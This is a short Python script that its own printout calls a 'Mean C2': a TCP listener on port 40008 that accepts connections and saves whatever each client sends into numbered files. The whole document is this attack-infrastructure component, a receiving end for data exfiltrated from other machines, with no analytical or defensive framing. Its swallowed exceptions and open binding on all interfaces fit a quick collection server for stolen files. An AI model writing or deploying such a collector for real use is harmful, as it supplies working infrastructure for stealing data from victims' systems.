import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 40008))
s.listen(10)

i = 1
print(f"Mean C2 ready for receiving on port {40008}")
while True:
    sc, address = s.accept()
    print(f"Connection from: {address}")
    filename = 'file_'+str(i)+".txt"
    f = open(filename, "wb")
    i += 1
    try:
        l = sc.recv(1024)
        while l:
            f.write(l)
            l = sc.recv(1024)
        f.close()
        sc.close()
    except:
        pass

s.close()